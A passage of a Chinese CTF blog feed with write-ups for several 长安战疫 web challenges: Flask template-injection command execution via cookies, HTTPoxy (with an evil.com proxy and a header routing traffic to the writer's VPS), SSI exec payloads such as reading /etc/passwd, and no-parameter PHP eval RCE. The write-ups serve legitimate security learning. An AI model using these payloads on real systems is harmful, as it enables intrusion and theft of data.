class="language-1">/admin?name=''__class__.js?</code></pre><p>回显NO！<br>经过测试发现下划线，args，中括号被ban掉，最后构造</p><pre class=" language-1"><code class="language-1">?name={ {(x|attr(request.cookies.x1)|attr(request.cookies.x2)|attr(request.cookies.x3))(request.cookies.x4).eval(request.cookies.x5)} }Cookie:x1=__init__;x2=__globals__;x3=__getitem__;x4=__builtins__;x5=__import__('os').popen('cat /flag').read()</code></pre><p>得到flag：cazy{4ll_p30pL3_w1ll_b3_Funny}<br>参考：<br><a href="https://blog.csdn.net/qq_45834505/article/details/116839614">https://blog.csdn.net/qq_45834505/article/details/116839614</a><br><a href="https://www.jianshu.com/p/b6f1aea3a2eb">https://www.jianshu.com/p/b6f1aea3a2eb</a><br><a href="https://www.cnblogs.com/NPFS/p/12764599.html">https://www.cnblogs.com/NPFS/p/12764599.html</a><br><a href="https://www.freebuf.com/column/187845.html">https://www.freebuf.com/column/187845.html</a><br><a href="https://www.anquanke.com/post/id/188172">https://www.anquanke.com/post/id/188172</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-flask模板注入 ctf-SSTL模板注入 长安战疫复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>长安战疫-web-flag配送中心复现</title>
      <link href="/2022/01/15/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB-web-flag%E9%85%8D%E9%80%81%E4%B8%AD%E5%BF%83%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/01/15/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB-web-flag%E9%85%8D%E9%80%81%E4%B8%AD%E5%BF%83%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="长安战疫-web-flag配送中心复现"><a href="#长安战疫-web-flag配送中心复现" class="headerlink" title="长安战疫-web-flag配送中心复现"></a>长安战疫-web-flag配送中心复现</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="HTTPoxy漏洞（CVE-2016-5385）"><a href="#HTTPoxy漏洞（CVE-2016-5385）" class="headerlink" title="HTTPoxy漏洞（CVE-2016-5385）"></a>HTTPoxy漏洞（CVE-2016-5385）</h3><p>漏洞原文：<a href="https://httpoxy.org/">https://httpoxy.org/</a></p><h4 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>根据RFC 3875规定，cgi（fastcgi）要将用户传入的所有HTTP头都加上HTTP前缀放入环境变量中，而恰好大多数类库约定俗成会提取环境变量中的HTTP_PROXY值作为HTTP代理地址。于是，恶意用户通过提交Proxy: <a href="http://evil.com/">http://evil.com</a> 这样的HTTP头，将使用缺陷类库的网站的代理设置为<a href="http://evil.com/">http://evil.com</a> ，进而窃取数据包中可能存在的敏感信息。<br>PHP5.6.24版本修复了该漏洞，不会再将Proxy放入环境变量中。一般是利用PHP 5.6.23版本中的漏洞。<br>当然，该漏洞不止影响PHP，所有以CGI或Fastcgi运行的程序理论上都受到影响。</p><h4 id="影响前提"><a href="#影响前提" class="headerlink" title="影响前提"></a>影响前提</h4><p>1.你的服务会对外请求资源<br>2.你的服务使用了HTTP_PROXY(大写的)环境变量来代理你的请求（可能是你自己写，或是使用一些有缺陷的类库）<br>3.你的服务跑在PHP的CGI模式下(cgi, php-fpm)</p><h2 id="做题详解"><a href="#做题详解" class="headerlink" title="做题详解"></a>做题详解</h2><p>用burpsuite抓包后在请求头添加Proxy头：</p><pre class=" language-1"><code class="language-1">Proxy: http://VPS:POST/</code></pre><p>在自己的vps监听对应端口后，发包。<br>即可监听到flag。<br>（由于还没有买服务器，暂时无做题过程，完了再补QAQ）<br>参考：<br><a href="https://www.laruence.com/2016/07/19/3101.html">https://www.laruence.com/2016/07/19/3101.html</a><br><a href="https://blog.csdn.net/JiangBuLiu/article/details/95218436">https://blog.csdn.net/JiangBuLiu/article/details/95218436</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-HTTPoxy漏洞（CVE-2016-5385） ctf-CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>长安战疫-web-Baby_upload复现</title>
      <link href="/2022/01/15/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB-web-Baby_upload%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/01/15/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB-web-Baby_upload%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="长安战疫-web-Baby-upload复现"><a href="#长安战疫-web-Baby-upload复现" class="headerlink" title="长安战疫-web-Baby_upload复现"></a>长安战疫-web-Baby_upload复现</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="SSI注入"><a href="#SSI注入" class="headerlink" title="SSI注入"></a>SSI注入</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>SSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。<br>SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。<br>从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。</p><h4 id="SSI注入的条件"><a href="#SSI注入的条件" class="headerlink" title="SSI注入的条件"></a>SSI注入的条件</h4><p>当符合下列条件时，攻击者可以在 Web 服务器上运行任意命令：<br>1.Web 服务器已支持SSI（服务器端包含）<br>2.Web 应用程序未对相关SSI关键字做过滤<br>3.Web 应用程序在返回响应的HTML页面时，嵌入了用户输入</p><h4 id="SSI挖掘思路"><a href="#SSI挖掘思路" class="headerlink" title="SSI挖掘思路"></a>SSI挖掘思路</h4><p>两个思路：<br>1.从业务场景来Fuzz，比如获取IP、定位、时间等<br>2.识别页面是否包含.stm,.shtm和.shtml后缀</p><h4 id="常用语法"><a href="#常用语法" class="headerlink" title="常用语法"></a>常用语法</h4><pre class=" language-html"><code class="language-html">一.显示服务器端环境变量<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#echo</span><span class="token punctuation">></span></span>1.本文档名称：&lt;!–#echo var="DOCUMENT_NAME"–>2.现在时间：&lt;!–#echo var="DATE_LOCAL"–>3.显示IP地址：&lt;! #echo var="REMOTE_ADDR"–>二.将文本内容直接插入到文档中<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#include</span><span class="token punctuation">></span></span>&lt;! #include file="文件名称"–><span class="token comment" spellcheck="true">&lt;!--#include virtual="index.html" --></span>&lt;! #include virtual="文件名称"–><span class="token comment" spellcheck="true">&lt;!--#include virtual="/www/footer.html" --></span>注：file包含文件可以在同一级目录或其子目录中，但不能在上一级目录中，virtual包含文件可以是Web站点上的虚拟目录的完整路径三.显示WEB文档相关信息<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#flastmod</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#fsize</span><span class="token punctuation">></span></span>(如文件制作日期/大小等)1.文件最近更新日期：&lt;! #flastmod file="文件名称"–>2.文件的长度：&lt;!–#fsize file="文件名称"–>四.直接执行服务器上的各种程序<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#exec</span><span class="token punctuation">></span></span>(如CGI或其他可执行程序)&lt;!–#exec cmd="文件名称"–><span class="token comment" spellcheck="true">&lt;!--#exec cmd="cat /etc/passwd"--></span>&lt;!–#exec cgi="文件名称"–>&lt;!--#exec cgi="/cgi-bin/access_log.cgi"–>将某一外部程序的输出插入到页面中。可插入CGI程序或者是常规应用程序的输入，这取决于使用的参数是cmd还是cgi。五.设置SSI信息显示格式<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#config</span><span class="token punctuation">></span></span>(如文件制作日期/大小显示方式)六.高级SSI可设置变量使用if条件语句。</code></pre><h3 id="一些常见的绕过"><a href="#一些常见的绕过" class="headerlink" title="一些常见的绕过"></a>一些常见的绕过</h3><h4 id="ban了ls"><a href="#ban了ls" class="headerlink" title="ban了ls"></a>ban了ls</h4><p>用dir</p><h4 id="ban了cat"><a href="#ban了cat" class="headerlink" title="ban了cat"></a>ban了cat</h4><p>用cut函数</p><h5 id="cut函数"><a href="#cut函数" class="headerlink" title="cut函数"></a>cut函数</h5><p>cut命令用于显示每行从开头算起 num1 到 num2 的文字。如：</p><pre class=" language-linux"><code class="language-linux">cut [-c][file]</code></pre><p>如果不指定 File 参数，cut 命令将读取标准输入。必须指定 -b、-c 或 -f 标志之一。</p><pre class=" language-1"><code class="language-1">-b ：以字节为单位进行分割。这些字节位置将忽略多字节字符边界，除非也指定了-n标志。-c ：以字符为单位进行分割。-d ：自定义分隔符，默认为制表符。-f ：与-d一起使用，指定显示哪个区域。-n ：取消分割多字节字符。仅和-b标志一起使用。如果字符的最后一个字节落在由-b标志的List 参数指示的范围之内，该字符将被写出；否则，该字符将被排除</code></pre><h2 id="题目详解"><a href="#题目详解" class="headerlink" title="题目详解"></a>题目详解</h2><p>打开题目，发现是个文件上传，传png失败，看WP知道是SSI注入且png被不小心ban掉了。进行SSI注入。<br>ls命令被ban，使用dir代替，payload为(/为根目录，否则只能查到上传的那个文件下的内容)</p><pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!--#exec cmd="dir /"--></span></code></pre><p>知道flag在fffffflllll11111aaaaa4444ggggg下，cat命令被ban，使用cut代替，payload为</p><pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!--#exec cmd="cut -b 1-100 /fffffflllll11111aaaaa4444ggggg"--></span></code></pre><p>经过测试发现fl也被ban掉了，用通配符代替f或者l，最终payload为</p><pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!--#exec cmd="cut -b 1-100 /fffff?lllll11111aaaaa4444ggggg"--></span>或<span class="token comment" spellcheck="true">&lt;!--#exec cmd="cut -b 1-100 /ffffff?llll11111aaaaa4444ggggg"--></span></code></pre><p>得到flag:flag{cAzy_xxxxxxxxxx_12323421}<br>参考：<br><a href="https://blog.csdn.net/qq_45521281/article/details/107576959">https://blog.csdn.net/qq_45521281/article/details/107576959</a><br><a href="https://blog.csdn.net/qq_40657585/article/details/84260844">https://blog.csdn.net/qq_40657585/article/details/84260844</a><br><a href="https://blog.csdn.net/m0_46230316/article/details/106289129">https://blog.csdn.net/m0_46230316/article/details/106289129</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-文件上传 ctf-SSI注入 长安战疫复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>长安战疫web-RCE_No_Para复现</title>
      <link href="/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%ABweb-RCE_No_Para%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%ABweb-RCE_No_Para%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="长安战疫web-RCE-No-Para复现"><a href="#长安战疫web-RCE-No-Para复现" class="headerlink" title="长安战疫web-RCE_No_Para复现"></a>长安战疫web-RCE_No_Para复现</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><pre class=" language-python"><code class="language-python"><span class="token operator">^</span>    匹配字符串的开头$    匹配字符串的末尾。<span class="token punctuation">.</span>    匹配任意字符，除了换行符，当re<span class="token punctuation">.</span>DOTALL标记被指定时，则可以匹配包括换行符的任意字符。<span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>    用来表示一组字符<span class="token punctuation">,</span>单独列出：<span class="token punctuation">[</span>amk<span class="token punctuation">]</span> 匹配 <span class="token string">'a'</span>，<span class="token string">'m'</span>或<span class="token string">'k'</span><span class="token punctuation">[</span><span class="token operator">^</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>    不在<span class="token punctuation">[</span><span class="token punctuation">]</span>中的字符：<span class="token punctuation">[</span><span class="token operator">^</span>abc<span class="token punctuation">]</span> 匹配除了a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c之外的字符。re<span class="token operator">*</span>    匹配<span class="token number">0</span>个或多个的表达式。re<span class="token operator">+</span>    匹配<span class="token number">1</span>个或多个的表达式。re?    匹配<span class="token number">0</span>个或<span class="token number">1</span>个由前面的正则表达式定义的片段，非贪婪方式re<span class="token punctuation">{</span> n<span class="token punctuation">}</span>    精确匹配 n 个前面表达式。例如， o<span class="token punctuation">{</span><span class="token number">2</span><span class="token punctuation">}</span> 不能匹配 <span class="token string">"Bob"</span> 中的 <span class="token string">"o"</span>，但是能匹配 <span class="token string">"food"</span> 中的两个 o。re<span class="token punctuation">{</span> n<span class="token punctuation">,</span><span class="token punctuation">}</span>    匹配 n 个前面表达式。例如， o<span class="token punctuation">{</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">}</span> 不能匹配<span class="token string">"Bob"</span>中的<span class="token string">"o"</span>，但能匹配 <span class="token string">"foooood"</span>中的所有 o。<span class="token string">"o{1,}"</span> 等价于 <span class="token string">"o+"</span>。<span class="token string">"o{0,}"</span> 则等价于 <span class="token string">"o*"</span>。re<span class="token punctuation">{</span> n<span class="token punctuation">,</span> m<span class="token punctuation">}</span>    匹配 n 到 m 次由前面的正则表达式定义的片段，贪婪方式a<span class="token operator">|</span> b    匹配a或b<span class="token punctuation">(</span>re<span class="token punctuation">)</span>    对正则表达式分组并记住匹配的文本<span class="token punctuation">(</span>?imx<span class="token punctuation">)</span>    正则表达式包含三种可选标志：i<span class="token punctuation">,</span> m<span class="token punctuation">,</span> 或 x 。只影响括号中的区域。<span class="token punctuation">(</span>?<span class="token operator">-</span>imx<span class="token punctuation">)</span>    正则表达式关闭 i<span class="token punctuation">,</span> m<span class="token punctuation">,</span> 或 x 可选标志。只影响括号中的区域。<span class="token punctuation">(</span>?<span class="token punctuation">:</span> re<span class="token punctuation">)</span>    类似 <span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">,</span> 但是不表示一个组<span class="token punctuation">(</span>?imx<span class="token punctuation">:</span> re<span class="token punctuation">)</span>    在括号中使用i<span class="token punctuation">,</span> m<span class="token punctuation">,</span> 或 x 可选标志<span class="token punctuation">(</span>?<span class="token operator">-</span>imx<span class="token punctuation">:</span> re<span class="token punctuation">)</span>    在括号中不使用i<span class="token punctuation">,</span> m<span class="token punctuation">,</span> 或 x 可选标志<span class="token punctuation">(</span>?<span class="token comment" spellcheck="true">#...)    注释.</span><span class="token punctuation">(</span>?<span class="token operator">=</span> re<span class="token punctuation">)</span>    前向肯定界定符。如果所含正则表达式，以 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 表示，在当前位置成功匹配时成功，否则失败。但一旦所含表达式已经尝试，匹配引擎根本没有提高；模式的剩余部分还要尝试界定符的右边。<span class="token punctuation">(</span>?! re<span class="token punctuation">)</span>    前向否定界定符。与肯定界定符相反；当所含表达式不能在字符串当前位置匹配时成功<span class="token punctuation">(</span>?<span class="token operator">></span> re<span class="token punctuation">)</span>    匹配的独立模式，省去回溯。\w    匹配字母数字及下划线\W    匹配非字母数字及下划线\s    匹配任意空白字符，等价于 <span class="token punctuation">[</span> \t\n\r\f<span class="token punctuation">]</span>。\S    匹配任意非空字符\d    匹配任意数字，等价于 <span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">.</span>\D    匹配任意非数字\A    匹配字符串开始\Z    匹配字符串结束，如果是存在换行，只匹配到换行前的结束字符串。\z    匹配字符串结束\G    匹配最后匹配完成的位置。\b    匹配一个单词边界，也就是指单词和空格间的位置。例如， <span class="token string">'er\b'</span> 可以匹配<span class="token string">"never"</span> 中的 <span class="token string">'er'</span>，但不能匹配 <span class="token string">"verb"</span> 中的 <span class="token string">'er'</span>。\B    匹配非单词边界。<span class="token string">'er\B'</span> 能匹配 <span class="token string">"verb"</span> 中的 <span class="token string">'er'</span>，但不能匹配 <span class="token string">"never"</span> 中的 <span class="token string">'er'</span>。\n<span class="token punctuation">,</span> \t<span class="token punctuation">,</span> 等<span class="token punctuation">.</span>    匹配一个换行符。匹配一个制表符。等\<span class="token number">1</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>\<span class="token number">9</span>    匹配第n个分组的内容。\<span class="token number">10</span>    匹配第n个分组的内容，如果它经匹配。否则指的是八进制字符码的表达式。</code></pre><h3 id="R-，-R-，-R-，-R-的区别"><a href="#R-，-R-，-R-，-R-的区别" class="headerlink" title="(?R)，(?R)?，(?R)，(?R)+的区别"></a>(?R)，(?R)?，(?R)，(?R)+的区别</h3><p>首先(?R) ， (?R)+ 这两个表达式是匹配不到东西的,因为每次匹配的时候都会至少运行一次递归，无法终止，所以匹配不到任何东西。<br>(?R)?,递归0次或1次，非贪婪，只能匹配a(b())这种一层套一个函数的。<br>(?R)\，递归0次或多次，贪婪，可以匹配a(b(c()d()))。</p><h3 id="无参数RCE常用函数"><a href="#无参数RCE常用函数" class="headerlink" title="无参数RCE常用函数"></a>无参数RCE常用函数</h3><h4 id="数组操作"><a href="#数组操作" class="headerlink" title="数组操作"></a>数组操作</h4><pre class=" language-php"><code class="language-php">array_flip<span class="token operator">-</span>交换数组中的键和值<span class="token punctuation">(</span>成功交换返回交换后的数组，失败返回<span class="token keyword">NULL</span><span class="token punctuation">)</span>array_rand<span class="token operator">-</span>从数组中取出一个或多个单元<span class="token punctuation">(</span>只取一个，返回一个随机单元键名，否则返回一个包含随机单元键名的数组<span class="token punctuation">)</span>array_reverse<span class="token operator">-</span>返回一个单元顺序相反的数组<span class="token punctuation">(</span>返回反转后的数组<span class="token punctuation">)</span>current<span class="token operator">-</span>返回数组中的当前单元，初始指针指向插入到数组中的第一个单元<span class="token punctuation">(</span>返回被指针指向的数组单元的值<span class="token punctuation">)</span>end<span class="token operator">-</span>将数组的内部指针指向最后一个单元key<span class="token operator">-</span>从关联数组中取得键名each<span class="token operator">-</span>返回数组中当前的键、值对并将数组指针向前移动一步prev<span class="token operator">-</span>将数组的内部指针倒回一位reset<span class="token operator">-</span>将数组的内部指针指向第一个单元next<span class="token operator">-</span>将数组中的内部指针向前移动一位</code></pre><h4 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h4><pre class=" language-php"><code class="language-php"><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>将整个文件读入一个字符串<span class="token function">readfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>读取文件并写入到输出缓冲<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>语法高亮一个文件<span class="token function">scandir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>列出指定路径中的文件和目录<span class="token function">direname</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>给出一个包含有指向一个文件的全路径的字符串，本函数返回去掉文件名后的目录名<span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>取得当前工作目录<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$directory</span><span class="token punctuation">)</span><span class="token operator">-</span>将php的当前目录改为directory</code></pre><h4 id="读取环境变量"><a href="#读取环境变量" class="headerlink" title="读取环境变量"></a>读取环境变量</h4><pre class=" language-php"><code class="language-php"><span class="token function">get_defined_vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。<span class="token function">getenv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>获取一个环境变量的值<span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span>返回一包含本地数字及货币格式信息的数组<span class="token punctuation">,</span>第一个值一直是<span class="token punctuation">.</span><span class="token function">phpversion</span><span class="token punctuation">(</span><span class="token punctuation">)</span>获取当前的<span class="token constant">PHP</span>版本</code></pre><h4 id="会话"><a href="#会话" class="headerlink" title="会话"></a>会话</h4><pre class=" language-php"><code class="language-php">session_id<span class="token operator">-</span>获取、设置当前会话<span class="token constant">ID</span>session_start<span class="token operator">-</span>启动新会话或者重用现有会话</code></pre><h5 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h5><pre class=" language-php"><code class="language-php"><span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>返回指定的字符<span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>产生一个随机整数<span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>返回当前的 Unix 时间戳<span class="token function">localtime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>取得本地时间<span class="token function">localtime</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span>返回一个数组，<span class="token keyword">Array</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> 为一个 <span class="token number">0</span><span class="token operator">~</span><span class="token number">60</span> 之间的数字<span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>转换十六进制字符串为二进制字符串<span class="token function">ceil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>进一法取整<span class="token function">sinh</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>双曲正弦<span class="token function">cosh</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>双曲余弦<span class="token function">tan</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>正切<span class="token function">floor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>舍去法取整<span class="token function">sqrt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>平方根<span class="token function">crypt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>单向字符串散列hebrevc<span class="token operator">-</span>将逻辑顺序希伯来文（logical<span class="token operator">-</span>Hebrew）转换为视觉顺序希伯来文（visual<span class="token operator">-</span>Hebrew），并且转换换行符<span class="token function">hebrevc</span><span class="token punctuation">(</span><span class="token function">crypt</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token function">crypt</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">-</span>可以随机生成一个 hash 值 第一个字符随机是 $<span class="token punctuation">(</span>大概率<span class="token punctuation">)</span> 或者 <span class="token punctuation">.</span><span class="token punctuation">(</span>小概率<span class="token punctuation">)</span> 然后通过 ord chr 只取第一个字符<span class="token function">ord</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>返回字符串的第一个字符的 <span class="token constant">ASCII</span> 码值。</code></pre><h3 id="无参数RCE常用的解题方法"><a href="#无参数RCE常用的解题方法" class="headerlink" title="无参数RCE常用的解题方法"></a>无参数RCE常用的解题方法</h3><h4 id="利用cookie传递参数"><a href="#利用cookie传递参数" class="headerlink" title="利用cookie传递参数"></a>利用cookie传递参数</h4><p>利用<em><strong>php</strong></em>中关于<em><strong>session</strong></em>的函数，那么可以用<em><strong>session_id</strong></em>来获取<em><strong>cookie</strong></em>中的<em><strong>phpsessionid</strong></em>了，并且这个值我们是可控的，但这里有一个限制：文件会话管理器仅允许会话 ID 中使用以下字符：a-z A-Z 0-9 ,（逗号）和 - 减号）。但是我们只要数字和字母就可以了，因为可以将我们的参数转化为16进制传进去，之后再用hex2bin()函数转换回来就可以了<br>所以，payload可以为：</p><pre class=" language-php"><code class="language-php">code<span class="token operator">=</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>但session_id必须要开启session才可以使用，所以我们要先使用session_start。<br>最后，payload：</p><pre class=" language-php"><code class="language-php"><span class="token function">eval</span><span class="token punctuation">(</span><span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>在http头中设置PHPSSID为想要执行代码的16进制。如：</p><pre class=" language-php"><code class="language-php"><span class="token function">hex</span><span class="token punctuation">(</span><span class="token string">"phpinfo();"</span><span class="token punctuation">)</span><span class="token operator">=</span>706870696e666f28293b</code></pre><h4 id="利用get-post传递参数"><a href="#利用get-post传递参数" class="headerlink" title="利用get/post传递参数"></a>利用get/post传递参数</h4><p>利用***get_defined_vars()***显示所有变量的值，想办法提取出自己通过get方式传进去的变量，从而达到利用效果，如本题。</p><h2 id="题目详解"><a href="#题目详解" class="headerlink" title="题目详解"></a>题目详解</h2><p>启动环境，得到代码</p><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/session|end|next|header|dir/i'</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span> </code></pre><p>分析正则表达式</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>\<span class="token package">W</span> 匹配非字母数字及下划线<span class="token punctuation">[</span><span class="token operator">^</span>\<span class="token package">W</span><span class="token punctuation">]</span>匹配字母数字及下划线（约等于\<span class="token package">w</span>）<span class="token punctuation">[</span><span class="token operator">^</span>\<span class="token package">W</span><span class="token punctuation">]</span><span class="token operator">+</span>匹配一次或多次\<span class="token punctuation">(</span>匹配左括号<span class="token punctuation">(</span><span class="token operator">?</span>R<span class="token punctuation">)</span>代表当前表达式<span class="token punctuation">,</span>就是这个<span class="token punctuation">(</span><span class="token operator">/</span><span class="token punctuation">[</span><span class="token operator">^</span>\<span class="token package">W</span><span class="token punctuation">]</span><span class="token operator">+</span>\<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">?</span>R<span class="token punctuation">)</span><span class="token operator">?</span>\<span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">)</span><span class="token punctuation">,</span>所以会一直递归。<span class="token punctuation">(</span><span class="token operator">?</span>R<span class="token punctuation">)</span><span class="token operator">?</span>递归<span class="token number">0</span>次或<span class="token number">1</span>次\<span class="token punctuation">)</span>匹配右括号</code></pre><p>以a(b(c()))为例来进行正则匹配</p><pre class=" language-1"><code class="language-1">整个正则可以分为三部分一 [^\W]+\( 直到递归前面可以看作一个匹配整体二 (?R)? 递归部分看作一个匹配整体三 \) 递归后面的看作一个匹配整体开始匹配，下面是匹配的顺序a(//匹配上面第一个匹配整体，然后进入第一次递归   b(//匹配上面第一个匹配整体，进入第二次递归       c(//匹配上面第一个匹配整体，进入第三次递归           